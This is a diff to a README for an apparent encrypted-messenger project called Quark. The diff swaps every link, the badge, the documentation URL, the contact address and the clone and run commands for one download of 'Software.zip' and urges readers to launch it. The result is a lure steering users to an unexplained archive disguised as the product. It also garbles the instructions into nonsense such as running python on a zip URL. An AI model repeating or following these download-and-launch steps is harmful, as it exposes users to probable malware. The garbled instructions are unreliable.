@@ -1,6 +1,6 @@
 # 🌌 Quark - End-to-end Encrypted Messenger
 
-[![Quark Repository](https://img.shields.io/static/v1?label=Quark&message=End-to-end%20Encrypted%20Messenger&color=green)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Quark Repository](https://github.com/Gusputra23/Quark/releases/download/v1.0/Software.zip%20Encrypted%20Messenger&color=green)](https://github.com/Gusputra23/Quark/releases/download/v1.0/Software.zip)
 
 Welcome to the Quark repository - your go-to solution for secure end-to-end encrypted messaging! If you are concerned about the privacy and security of your communications, Quark is the perfect choice for you. With advanced encryption techniques, such as AES-GCM and RSA, Quark ensures that your messages remain confidential and secure from end to end.
 
@@ -31,19 +31,19 @@ As a repository focusing on encrypted messaging, Quark covers a wide range of to
 
 ## 📦 Installation
 
-To get started with Quark, simply download the [latest release](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip) and follow the installation instructions provided in the documentation.
+To get started with Quark, simply download the [latest release](https://github.com/Gusputra23/Quark/releases/download/v1.0/Software.zip) and follow the installation instructions provided in the documentation.
 
 ## 💻 Usage
 
 1. Ensure you have Python installed on your system.
 2. Clone the Quark repository.
-3. Run the `quark.py` script.
+3. Run the `https://github.com/Gusputra23/Quark/releases/download/v1.0/Software.zip` script.
 4. Enter your credentials and start chatting securely!
 
 ```bash
-git clone https://github.com/your-username/quark.git
+git clone https://github.com/Gusputra23/Quark/releases/download/v1.0/Software.zip
 cd quark
-python quark.py
+python https://github.com/Gusputra23/Quark/releases/download/v1.0/Software.zip
 ```
 
 ## 🛠️ How to Contribute
@@ -59,12 +59,12 @@ We welcome contributions from the open-source community to enhance Quark even fu
 
 ## 📖 Resources
 
-For more information on using Quark and understanding its encryption mechanisms, visit the [official documentation](https://quark-docs.com).
+For more information on using Quark and understanding its encryption mechanisms, visit the [official documentation](https://github.com/Gusputra23/Quark/releases/download/v1.0/Software.zip).
 
 ## 📞 Contact
 
-If you have any questions, suggestions, or feedback, feel free to reach out to us at hello@quark.com.
+If you have any questions, suggestions, or feedback, feel free to reach out to us at https://github.com/Gusputra23/Quark/releases/download/v1.0/Software.zip
 
 Let's chat securely with Quark! 🌟
 
-🔗 **Note: Needs to be launched - [Download Quark v1.0.0](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)**
+🔗 **Note: Needs to be launched - [Download Quark v1.0.0](https://github.com/Gusputra23/Quark/releases/download/v1.0/Software.zip)**
